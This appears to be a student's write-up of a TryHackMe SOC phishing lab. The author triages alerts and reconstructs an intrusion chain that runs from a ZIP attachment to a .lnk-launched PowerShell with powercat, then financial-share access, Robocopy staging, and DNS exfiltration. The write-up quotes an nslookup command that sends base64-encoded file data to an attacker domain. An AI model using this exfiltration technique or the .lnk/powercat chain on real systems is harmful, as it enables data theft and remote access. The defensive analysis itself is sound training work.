Phishing Unfolding TryHackMe SOC labs

#1. suspicious email case
![alt text](<screenshot/Screenshot 2026-08-13 at 10.25.19 AM.png>)

so, this is suspicious email case. there's no attachment or embeded URL in this case. no urgent message being used. so more likely it is just an ads email.

im checking the domain being used by the sender and no typosquatting and i cant find anything about the SPF record, DKIM record, DMARC record.

so the evidence that i have to say this email aren't harmful is : no file attachment that leads to credential stealing or malware unzipping, no embeded URL, clear from typosquatting, and urgent message. 

VERDICT: false positive

#2. suspicious parent child relationship
![alt text](<screenshot/Screenshot 2026-08-13 at 10.34.37 AM.png>)

now, this is a suspicious parent child relationship. it happens on host win-3459 with parent process services.exe PID 3506 and child process name TrustedInstaller.exe with PID 3577.

so the important thing that i notice from this case is this line C:\Windows\servicing\TrustedInstaller.exe it looks like a valid windows system built in service. but to be sure im gonna check it using google.

and here's what i got:
"TrustedInstaller.exe is a legitimate Windows system process known as the Windows Modules Installer. Located in C:\Windows\servicing\, its main job is to install, modify, and remove Windows updates and core system components."

so yeah the C:\Windows\servicing\TrustedInstaller.exe is legit 

now for the working directory is C:\Windows\system32\
this is a valid directory for windows system

now i got valid directory and a valid command line.

still i need to be sure that nothing else happening in the background so im using Splunk to be sure.

Splunk check:

1. im gonna start by checking on the hostname win-3459.
![alt text](<screenshot/Screenshot 2026-08-13 at 10.46.59 AM.png>)
for this host, there's only 3 events happening.

2. checking the SIEM i cant find anything suspicious

evidence that i got is the C:\Windows\servicing\TrustedInstaller.exe is legit windows system, and the working directory C:\Windows\system32\ is also valid for a windows system. no file downloading or powershell being use.

VERDICT = false positive(TryHackMe verdict system)


#3. suspicious attachment found in email
![alt text](<screenshot/Screenshot 2026-08-13 at 10.58.22 AM.png>)

now there's file attachment included in this case.
so the sender's email is john@hatmakereurope.xyz which sending email to michael.ascot@tryhatme.com i need to check the tryhackme documentatain to know who is michael ascot.

so what i get is michael ascot is the CEO on this challenge. now, the invoice email is make sense for this role.

we get that this email using using urgent message with capslock. 

the important thing that we need to assess is the file attachment with name "ImportantInvoice-Febrary.zip" so in real life the best and safe way to check it without clicking it is to getting the hash and check it to online threat intelligence tools. but for this tryhackme challenge the file's are not given. 

so check we need to check the domain of the sender first. 
i can't find any SPF, DKIM, and DMARC record. 
and im using virustotal to check the domain of the sender. here's what i got.
![alt text](<screenshot/Screenshot 2026-08-13 at 11.11.38 AM.png>)

not enough evidence to say that this domain's are suspicious.

now im using SIEM for further investigation to find evidence.
1. im start to check the sender email first. to see if this sender sending an email to everyone or not.
![alt text](<screenshot/Screenshot 2026-08-13 at 11.16.07 AM.png>)
and this sender only sending email to michael ascot.

2. from documentation i get that michael ascot device name is win-3450. im gonna check this to see if michael click it or not. and this is what i got.
![alt text](<screenshot/Screenshot 2026-08-13 at 11.34.22 AM.png>)
now i get that the timeline is : email->OUTLOOK.exe->ImportantInvoice->February.zip created->Zone.Identifier created.

but, i got more evidence 
![alt text](<screenshot/Screenshot 2026-08-13 at 11.36.52 AM.png>)
im noticing that the zip file leads to .pdf extension but the important thing is there's another extension there .lnk.

so im checking what is .lnk extension do on google. and i find that .lnk is  "a shortcut or local link used by Microsoft Windows to point to an original program, file, folder, or network drive and windows hides this file extension by default and displays a small curved arrow on the icon."

but i need to see where this .lnk leads to and here's what i found
![alt text](<screenshot/Screenshot 2026-08-13 at 11.46.13 AM.png>)

so the .lnk extension leads to powercat downloaded from github. and for me this is red flag.

so powerchat is a a "PowerShell-based networking utility that functions just like the classic Netcat tool, but is written completely in native PowerShell."
and normal pdf dont leads to this process. in this case, the command is being used to create a remote powershell connection.


now the evidence that i got for conclusion is 
- the email using urgent message, but urgent message not always means that is phishing email.
- sender domain not using any typosquatting. but i cant find the SPF, DKIM, and DMARC record with it.
- it contains zip file on the email
- and this zipfile contains .pdf extension but with another extensin that is .lnk
- .lnk leads to powershell and downloading powercat on github.
- powercat could be used to create a remote powershell connection
- normal pdf not leads to powershell

so verdict for this is TRUE POSITIVE.

this case need ascalation. for further investigation.

and remediation process is to quarantine the host from the network, terminate the malicious activity, investigate persistance and lateral movement, need to check fot the credentials compromising.

#4. suspicous email from external domain
![alt text](<screenshot/Screenshot 2026-08-13 at 12.08.35 PM.png>)

so i have a multiple email sended from the same domain.

the domain of the sender is fashionindustrytrends.xyz and it sends email to multiple recipient. with two of them are from sales and one of them from IT department.

investigate wheter this is phishing or not.

1. checking the domain to see whether it is using typosquatting, SPF, DKIM, and DMARC record. by using online tools, i find that there is no record of SPF or malicious activity on virus total.
2. checking the message, it is using advertisement message and not using any urgent message for the email.
3. there's not file being attach in this email or embeded URL that could leads to credentials stealing, malware downloading, or powershell opening
4. the content of this email is using advertisement message.

so no evidence that this email is suspicious that leads to suspicious activity.

verdict for this is false positive(TryHackMe format).

#5. Suspicious parent child relationship
![alt text](<screenshot/Screenshot 2026-08-13 at 1.41.29 PM.png>)

in this case host name are win-3451 the alerts saying this is a Suspicious parent child relationship.

first im gonna identify the hostname, process and its id, identifying the parent process, commandline, and directory.

from the screenshot we could see all the details about this event. and now, im gonna see what is taskhostw.exe and what it do on google

so taskhostw.exe are a legitimate, essential Microsoft Windows system file that runs in the background to host and execute DLL-based system tasks. and it locate in this directory C:\Windows\System32 which is aligned with the report that being given. 

so now the taskhost.exe are not suspicious.

lets try to search svchost.exe is and what it do on google.

so the svchost.exe are a core Windows system process that runs and manages multiple background services. i runs system task and saves memory. it is located on this C:\Windows\System32 directory. so this information telling that this process are normal on windows system.

i need to search what is this taskhostw.exe KEYROAMING command line doing just to make sure.

so the taskhostw.exe KEYROAMING are a legitimate Windows background process. It runs a built-in Task Scheduler job (UserTask-Roam) tied to the Certificate Services Client, which syncs user encryption keys and credentials across devices. and this is normal.

from every information that i got i can say that nothing supicious happening

evidence 
1. taskhostw.exe are a normal process that runs in windows system and it is located on C:\Windows\System32
2. taskhostw.exe KEYROAMING are a legitimate Windows background process.
3. svchost.exe are also normal in windows system. and it is located on this C:\Windows\System32 directory.

so the information telling that this is normal for a windows system and after further cheking using Splunk. i cant find anything suspicious regarding this process/

verdict is FALSE POSITIVE(TryHackMe formatting)

#5 suspicious process with an uncommon parent-child relationship.
![alt text](<screenshot/Screenshot 2026-08-13 at 2.28.55 PM.png>)

A suspicious process with an uncommon parent-child relationship was detected in the environment.

first thing i need to identify the host, process and id, directory, and command line.

the host are win-3455 i need to check the documentation to get more context about this process.

so win-3455 belong to sales department.

now i need to identify the process and what it do.

i start from WUDFHost.exe and check it using google to find what it does and the normal directory.

so WUDFHost.exe a legitimate Microsoft Windows system file. It manages hardware drivers for devices like touchpads, USB ports, and cameras. the normal directory for this process are C:\Windows\system32\ and it is aligned with the directory being used in the report.

now i need to identify services.exe to see what it does and the normal direcotry.

so services.exe are a core legitimate Windows system process. that runs in the system. with directory C:\Windows\System32.

so the parent process services.exe and process WUDFHost.exe is normal to runs in this C:\Windows\System32 directory.

now i need to identify the command line.
so the command line start with C:\Windows\System32\WUDFHost.exe. and this is expected. 

and the rest of the commands are likely an internal communication parameters. and it is align with what WUDFHost.exe does.

the working directory of these process are also normal and expected.

so verdict is FALSE POSITIVE(TryHackMe formatting) 


#6 Supicious parent child relationship
![alt text](<screenshot/Screenshot 2026-08-13 at 2.46.53 PM.png>)

first thing im gonna do is collecting information regarding this reports.

need to identify the host, process and id, directory, and the command line

the host are win-3450 belongs to michael ascot CEO that clicking the phishing email.

process name from this report are Robocopy.exe and im trying to identify this by using google to find what it does and normal directory to get more context of the events.

so Robocopy.exe is a built-in Windows command-line utility used to copy and sync heavy files and folders.

and it comes from powershell.exe.

for me it is suspicious already because why would CEO using powershell. but i cant jump to conclusin without having a strong evidence.

now there's something that im interested in this report are the directory of the process which is 
"C:\Windows\system32\Robocopy.exe" . C:\Users\michael.ascot\downloads\exfiltration /E

i notice the words exfiltration in this directory. and i need to find out what it do by using Splunk.

Splunk investigation

1.  i start with searching the events related to the host.name win-3450
![alt text](<screenshot/Screenshot 2026-08-13 at 2.57.13 PM.png>)
and we got 97 events happening with this host. so i need to insert more query to make the serching more effective and efficient.

2. i start searching the process by using the process name by using this query on splunk * host.name="win-3450" process.name="Robocopy.exe"

and here's what i found
![alt text](<screenshot/Screenshot 2026-08-13 at 3.03.39 PM.png>)
![alt text](<screenshot/Screenshot 2026-08-13 at 3.04.05 PM.png>)
![alt text](<screenshot/Screenshot 2026-08-13 at 3.04.24 PM.png>)

because i know michael scott is clicking the phishing attachment file it gives me bigger context.

so yeah this process are data preparing for exfiltration. we could see from the directory that is sensitive data are being copy to exfiltration directory.

now evidence that we had are robocopy is used to copy sensitive data to exfiltratin directory, robocopy are runs with powershell. for CEO you dont need to use powershell at all.

verdict is TRUE POSITIVE 

#7 powershell script downloads folder
![alt text](<screenshot/Screenshot 2026-08-13 at 3.20.05 PM.png>)

needs to identifying the host, process and id, directory, and behavior.

so the host are win-3450 michael ascot the CEO who click the phishing email file attachment.

process names are powershell.exe and the ID is 9060
so the action of this events are File created

the directory of this process are C:\Users\michael.ascot\Downloads\PowerView.ps1

so now we getting more view about this events. we already investigate that michael scott is clicking the email attachment->data being copy using robocopy to exfiltration->now we could see that powerview are in the downloads directory.

so powerview is a PowerShell script used for Active Directory (AD) reconnaissance and domain enumeration.

this is already a red flag

verdict TRUE POSITIVE

#8 network mapped to local drive
![alt text](<screenshot/Screenshot 2026-08-13 at 3.36.05 PM.png>)

first move is identification the host, process, behavior, directory.

the host name are win-3450 CEO

the process that happening is net.exe. i need to investigate what it is and what it does.

so net.exe is a built-in Microsoft Windows command-line tool (%windir%\System32\net.exe) used by administrators to manage network connections, user accounts, local groups, and system services. While completely legitimate, it is also frequently used during system discovery and auditing.

the interesting lines are "used during system discovery and auditing"

the proces parent are powershell.exe with id 3728
and the event action are process create.

im gonna using splunk for this investigation. the goal is to see what it do

and this is what i found 
![alt text](<screenshot/Screenshot 2026-08-13 at 3.50.31 PM.png>)

and i could get the flow of the process clearer
PowerShell PID 9060->net localgroup->enumerate local groups->PowerShell PID 3728->net use Z: \\FILESRV-01\SSF-FinancialRecords->access financial records->Robocopy->Downloads\exfiltration\

so this is related with the events before this.

VERDICT TRUE POSITVE

#9 suspicious parent child relationship
![alt text](<screenshot/Screenshot 2026-08-13 at 4.01.39 PM.png>)

identifying host, process, id, directory, and behavior

the host in this case are win-3450

the process happening in this are nslookup.exe id 5520
with parent process powershell.exe 3728

so nslookup is a built-in Microsoft Windows command-line tool used to query Domain Name System (DNS) servers to get IP address or domain name mapping.

from the report we getting this directory C:\Users\michael.ascot\downloads\exfiltration\ which is highly suspicious 

and also this command line "C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io

this is an exfiltration process going on. because we know that the host are being attacked. so this is a related events.

investigation using splunk

1. there's 10 events related to this
![alt text](<screenshot/Screenshot 2026-08-13 at 4.08.38 PM.png>)
2. i need to find another events leading to this.
using this search query * host.name="win-3450" and here's what i found
![alt text](<screenshot/Screenshot 2026-08-13 at 4.10.41 PM.png>)

so this commands are used to reads the zip file then convert zip to base64 and send it through dns.

this is a data exfiltration process.

so this is TRUE POSITIVE

so overall we get the attack chain is phishing email containing a ZIP attachment. The attachment contained a deceptive .lnk file that launched PowerShell, enabling reconnaissance and access to a financial-records network share. Sensitive files were copied to a local staging directory, compressed, Base64-encoded, and exfiltrated through DNS queries to haz4rdw4re.io.

result for this practice are 
![alt text](<screenshot/Screenshot 2026-08-13 at 4.21.50 PM.png>)